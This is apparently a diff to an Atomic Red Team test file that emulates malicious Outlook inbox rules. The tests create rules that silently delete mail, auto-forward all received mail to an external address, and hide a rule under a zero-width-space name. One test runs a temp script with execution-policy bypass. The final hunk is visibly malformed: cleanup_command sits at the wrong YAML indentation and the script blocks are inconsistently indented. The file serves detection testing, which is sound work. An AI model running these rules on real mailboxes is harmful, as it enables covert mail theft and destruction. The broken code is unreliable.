@@ -7,7 +7,7 @@ atomic_tests:
 # TEST 1 — COM Object: Rule Triggers on Subject Keyword
 # ============================================================
 - name: Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object
-  auto_generated_guid: 
+  auto_generated_guid:
   description: |
     Creates a malicious Outlook rule via the COM object that permanently deletes
     emails when an email with a specific subject keyword arrives. Simulates
@@ -66,16 +66,26 @@ atomic_tests:
       $rules.Save()
       Write-Host "[+] Rule '#{rule_name}' created. Emails with subject '#{trigger_subject}' will be permanently deleted."
     cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
       $outlook   = New-Object -ComObject Outlook.Application
       $namespace = $outlook.GetNamespace("MAPI")
       $rules     = $namespace.DefaultStore.GetRules()
-      for ($i = 1; $i -le $rules.Count; $i++) {
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
           if ($rules.Item($i).Name -eq "#{rule_name}") {
               $rules.Remove($rules.Item($i).Name)
-              $rules.Save()
-              Write-Host "[+] Rule '#{rule_name}' removed."
-              break
+              $removed = $true
           }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
       }
 
 
@@ -83,7 +93,7 @@ atomic_tests:
 # TEST 2 — COM Object: Rule Triggers on Sender Address
 # ============================================================
 - name: Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object
-  auto_generated_guid: 
+  auto_generated_guid:
   description: |
     Creates an Outlook rule via COM that permanently deletes emails received
     from a specific sender address. Adversaries use sender-based triggers to
@@ -142,16 +152,26 @@ atomic_tests:
       $rules.Save()
       Write-Host "[+] Sender-based rule '#{rule_name}' created. Emails from '#{trigger_sender}' will be permanently deleted."
     cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
       $outlook   = New-Object -ComObject Outlook.Application
       $namespace = $outlook.GetNamespace("MAPI")
       $rules     = $namespace.DefaultStore.GetRules()
-      for ($i = 1; $i -le $rules.Count; $i++) {
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
           if ($rules.Item($i).Name -eq "#{rule_name}") {
               $rules.Remove($rules.Item($i).Name)
-              $rules.Save()
-              Write-Host "[+] Rule '#{rule_name}' removed."
-              break
+              $removed = $true
           }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
       }
 
 
@@ -159,7 +179,7 @@ atomic_tests:
 # TEST 3 — COM Object: Auto-Forward Rule (Exfiltration)
 # ============================================================
 - name: Outlook Rule - Auto-Forward Emails to External Address via COM Object
-  auto_generated_guid: 
+  auto_generated_guid:
   description: |
     Creates an Outlook rule that automatically forwards all received emails to
     an external address. Simulates Business Email Compromise (BEC) and insider
@@ -218,16 +238,26 @@ atomic_tests:
       Write-Host "[+] Auto-forward rule '#{rule_name}' created -> #{forward_to_address}"
       Write-Host "[!] Run cleanup immediately after verifying rule creation in Outlook."
     cleanup_command: |
+      $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+      if ($isAdmin) {
+          Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+          exit 1
+      }
       $outlook   = New-Object -ComObject Outlook.Application
       $namespace = $outlook.GetNamespace("MAPI")
       $rules     = $namespace.DefaultStore.GetRules()
-      for ($i = 1; $i -le $rules.Count; $i++) {
+      $removed   = $false
+      for ($i = $rules.Count; $i -ge 1; $i--) {
           if ($rules.Item($i).Name -eq "#{rule_name}") {
               $rules.Remove($rules.Item($i).Name)
-              $rules.Save()
-              Write-Host "[+] Forwarding rule '#{rule_name}' removed."
-              break
+              $removed = $true
           }
+      }
+      if ($removed) {
+          $rules.Save()
+          Write-Host "[+] All instances of forwarding rule '#{rule_name}' removed."
+      } else {
+          Write-Host "[*] Rule '#{rule_name}' not found - already removed."
       }
 
 
@@ -235,7 +265,7 @@ atomic_tests:
 # TEST 4 — COM Object: Enumerate All Existing Rules (Discovery)
 # ============================================================
 - name: Outlook Rules - Enumerate Existing Rules via PowerShell COM Object
-  auto_generated_guid: 
+  auto_generated_guid:
   description: |
     Enumerates all Outlook rules configured on the local profile using the
     PowerShell COM object. Simulates the discovery phase where an adversary
@@ -284,111 +314,17 @@ atomic_tests:
       }
     cleanup_command: |
       Write-Host "[*] No cleanup required for enumeration test."
+    
 
 
 # ============================================================
-# TEST 5 — Exchange PowerShell: Server-Side Rule via O365
-# ============================================================
-- name: Outlook Rule - Create Server-Side Rule via Exchange PowerShell
-  auto_generated_guid: 
-  description: |
-    Creates a server-side Outlook inbox rule using the Exchange Online
-    PowerShell module (New-InboxRule cmdlet). Server-side rules persist in
-    the Exchange mailbox independently of the local Outlook client and survive
-    Outlook reinstallation and profile resets. Simulates the technique used
-    in O365 BEC and post-compromise persistence scenarios.
-    Credentials are passed as input arguments to avoid interactive auth
-    window handle errors when running inside the Atomic Red Team executor.
-    Use a dedicated test account - do not use production credentials.
-    Requires Exchange Online or on-prem Exchange with EMS access.
-  supported_platforms:
-    - windows
-  input_arguments:
-    rule_name:
-      description: Name for the malicious inbox rule
-      type: string
-      default: AtomicTest_T1137005_ServerSide
-    trigger_subject:
-      description: Subject keyword to trigger the rule
-      type: string
-      default: "atomic-rt-trigger"
-    target_mailbox:
-      description: Mailbox UPN to target (leave blank to use current user)
-      type: string
-      default: ""
-    move_to_folder:
-      description: Folder to move triggered emails into
-      type: string
-      default: "DeletedItems"
-    upn:
-      description: Microsoft 365 UPN for authentication (test account only)
-      type: string
-      default: "user@yourdomain.com"
-    password:
-      description: Microsoft 365 password for authentication (test account only)
-      type: string
-      default: "YourPasswordHere"
-  dependencies:
-    - description: ExchangeOnlineManagement module must be installed
-      prereq_command: |
-        if (Get-Module -ListAvailable -Name ExchangeOnlineManagement) { exit 0 } else { exit 1 }
-      get_prereq_command: |
-        Install-Module -Name ExchangeOnlineManagement -Force -Scope CurrentUser -AllowClobber
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      Import-Module ExchangeOnlineManagement
-
-      $secPass = ConvertTo-SecureString "#{password}" -AsPlainText -Force
-      $cred    = New-Object PSCredential("#{upn}", $secPass)
-
-      try {
-          Connect-ExchangeOnline -Credential $cred -ShowBanner:$false
-      } catch {
-          Write-Host "[-] Authentication failed: $_"
-          Write-Host "    Ensure upn and password input arguments are set to valid M365 test account credentials."
-          exit 1
-      }
-
-      $params = @{
-          Name                 = "#{rule_name}"
-          SubjectContainsWords = "#{trigger_subject}"
-          MoveToFolder         = "#{move_to_folder}"
-          StopProcessingRules  = $true
-          Enabled              = $true
-      }
-      if ("#{target_mailbox}" -ne "") { $params["Mailbox"] = "#{target_mailbox}" }
-
-      New-InboxRule @params
-      Write-Host "[+] Server-side inbox rule '#{rule_name}' created in Exchange."
-      Disconnect-ExchangeOnline -Confirm:$false
-    cleanup_command: |
-      Import-Module ExchangeOnlineManagement
-
-      $secPass = ConvertTo-SecureString "#{password}" -AsPlainText -Force
-      $cred    = New-Object PSCredential("#{upn}", $secPass)
-
-      try {
-          Connect-ExchangeOnline -Credential $cred -ShowBanner:$false
-      } catch {
-          Write-Host "[-] Authentication failed: $_"
-          exit 1
-      }
-
-      $removeParams = @{ Name = "#{rule_name}"; Confirm = $false }
-      if ("#{target_mailbox}" -ne "") { $removeParams["Mailbox"] = "#{target_mailbox}" }
-
-      Remove-InboxRule @removeParams -ErrorAction SilentlyContinue
-      Write-Host "[+] Server-side rule '#{rule_name}' removed."
-      Disconnect-ExchangeOnline -Confirm:$false
-
-
-# ============================================================
-# TEST 6 — Hidden Rule: Obfuscated Name (MAPI Evasion)
+# TEST 5 — Hidden Rule: Obfuscated Name (MAPI Evasion)
+# FIX: Write script to a temp .ps1 file and invoke it via
+#      Start-Process to avoid the ART executor's argument
+#      quoting mangling the zero-width space byte sequence.
 # ============================================================
 - name: Outlook Rule - Create Rule with Obfuscated Blank Name (MAPI Evasion)
-  auto_generated_guid: 
+  auto_generated_guid:
   description: |
     Creates an Outlook rule with a zero-width space as its display name,
     making it appear blank and invisible in the standard Outlook Rules UI.
@@ -401,6 +337,8 @@ atomic_tests:
     cannot be created programmatically per Microsoft's Rules object model.
     NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
     session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+    NOTE: Script is written to a temp file before execution to prevent the
+    ART executor's quote-wrapping from mangling the zero-width space bytes.
   supported_platforms:
     - windows
   input_arguments:
@@ -440,7 +378,11 @@ atomic_tests:
           exit 1
       }
 
-      # Build zero-width space from bytes at runtime to avoid YAML encoding issues
+      # Write the script body to a temp file to prevent ART executor quoting
+      # from mangling the zero-width space byte sequence at parse time.
+      $tmpScript = "$env:TEMP\T1137005_hidden_rule_create.ps1"
+
+      $scriptContent = @'
       $hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))
 
       $outlook   = New-Object -ComObject Outlook.Application
@@ -450,11 +392,11 @@ atomic_tests:
 
       $cond = $rule.Conditions.Subject
       $cond.Enabled = $true
-      $cond.Text    = @("#{trigger_subject}")
+      $cond.Text    = @("TRIGGER_SUBJECT_PLACEHOLDER")
 
       $action          = $rule.Actions.PlaySound
       $action.Enabled  = $true
-      $action.FilePath = "#{sound_file_path}"
+      $action.FilePath = "SOUND_FILE_PLACEHOLDER"
 
       $rule.Enabled = $true
       $rules.Save()
@@ -462,23 +404,46 @@ atomic_tests:
       Write-Host "[+] Hidden rule created with zero-width space name."
       Write-Host "[*] Open Outlook via File -> Manage Rules and Alerts - rule name will appear blank."
       Write-Host "[*] Verify rule exists via PowerShell COM enumeration (Test 4) or Get-InboxRule in Exchange."
-    cleanup_command: |
-      $hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))
-      $outlook    = New-Object -ComObject Outlook.Application
-      $namespace  = $outlook.GetNamespace("MAPI")
-      $rules      = $namespace.DefaultStore.GetRules()
-      $removed    = $false
+      '@
 
-      for ($i = 1; $i -le $rules.Count; $i++) {
-          if ($rules.Item($i).Name -eq $hiddenName) {
-              $rules.Remove($rules.Item($i).Name)
-              $rules.Save()
-              Write-Host "[+] Hidden rule removed."
-              $removed = $true
-              break
-          }
-      }
+            # Substitute input arguments at runtime (avoids YAML quoting issues with special chars)
+            $scriptContent = $scriptContent -replace 'TRIGGER_SUBJECT_PLACEHOLDER', '#{trigger_subject}'
+            $scriptContent = $scriptContent -replace 'SOUND_FILE_PLACEHOLDER', '#{sound_file_path}'
 
-      if (-not $removed) {
-          Write-Host "[-] Hidden rule not found - may have already been removed."
-      }
+            $scriptContent | Set-Content -Path $tmpScript -Encoding UTF8
+            powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+            Remove-Item $tmpScript -ErrorAction SilentlyContinue
+  cleanup_command: |
+            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
+            if ($isAdmin) {
+                Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
+                exit 1
+            }
+
+            $tmpScript = "$env:TEMP\T1137005_hidden_rule_cleanup.ps1"
+
+            $scriptContent = @'
+            $hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))
+            $outlook    = New-Object -ComObject Outlook.Application
+            $namespace  = $outlook.GetNamespace("MAPI")
+            $rules      = $namespace.DefaultStore.GetRules()
+            $removed    = $false
+
+            for ($i = $rules.Count; $i -ge 1; $i--) {
+                if ($rules.Item($i).Name -eq $hiddenName) {
+                    $rules.Remove($rules.Item($i).Name)
+                    $removed = $true
+                }
+            }
+
+            if ($removed) {
+                $rules.Save()
+                Write-Host "[+] Hidden rule(s) removed."
+            } else {
+                Write-Host "[-] Hidden rule not found - may have already been removed."
+            }
+            '@
+
+                  $scriptContent | Set-Content -Path $tmpScript -Encoding UTF8
+                  powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+                  Remove-Item $tmpScript -ErrorAction SilentlyContinue
